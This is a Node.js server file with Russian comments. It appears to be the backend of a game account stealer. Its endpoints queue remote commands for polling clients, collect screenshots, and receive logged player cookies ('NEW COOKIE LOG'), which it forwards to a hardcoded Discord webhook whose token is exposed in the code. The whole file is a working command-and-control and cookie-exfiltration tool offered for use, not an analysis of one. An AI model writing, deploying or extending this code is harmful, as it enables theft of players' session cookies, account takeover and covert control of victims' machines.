const http = require('http');
const fetch = require('node-fetch');

// Конфигурация
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
let lastCommand = { command: "", args: [] };
let screenshotData = null;

const server = http.createServer(async (req, res) => {
    try {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Content-Type', 'application/json');

        // [1] Обработка команд
        if (req.method === 'POST' && req.url === '/command') {
            let body = '';
            for await (const chunk of req) body += chunk;
            
            const { command, args } = JSON.parse(body);
            lastCommand = { command, args: args || [] };
            
            if (command === "user_chat" || command === "execute_log") {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**${args[0]}:** ${args[1]}`
                    })
                }).catch(console.error);
            }
            
            return res.end(JSON.stringify({ status: "OK" }));
        }

        // [2] Обработка куки
        if (req.method === 'POST' && req.url === '/log_cookie') {
            let body = '';
            for await (const chunk of req) body += chunk;
            
            const { player, cookie, method, game_id, timestamp } = JSON.parse(body);
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🍪 NEW COOKIE LOG",
                        color: 0xFFA500,
                        fields: [
                            { name: "Player", value: player, inline: true },
                            { name: "Method", value: method || "Unknown", inline: true },
                            { name: "Game ID", value: game_id.toString(), inline: true },
                            { name: "Time", value: new Date(timestamp * 1000).toISOString() },
                            { name: "Cookie", value: "||`REDACTED`||" }
                        ]
                    }]
                })
            });
            
            return res.end(JSON.stringify({ status: "Logged" }));
        }

        // [3] Остальные endpoints
        if (req.method === 'GET' && req.url === '/data') {
            return res.end(JSON.stringify(lastCommand));
        }

        if (req.method === 'POST' && req.url === '/screenshot') {
            let body = '';
            for await (const chunk of req) body += chunk;
            screenshotData = JSON.parse(body).image;
            return res.end(JSON.stringify({ status: "Received" }));
        }

        if (req.method === 'GET' && req.url === '/screenshot') {
            return res.end(JSON.stringify(
                screenshotData ? { image: screenshotData } : { error: "No screenshot" }
            ));
        }

        res.statusCode = 404;
        res.end(JSON.stringify({ error: "Not Found" }));
    } catch (e) {
        console.error("Server error:", e);
        res.statusCode = 500;
        res.end(JSON.stringify({ error: "Internal Server Error" }));
    }
});

server.listen(3000, () => console.log("Server running on port 3000"));
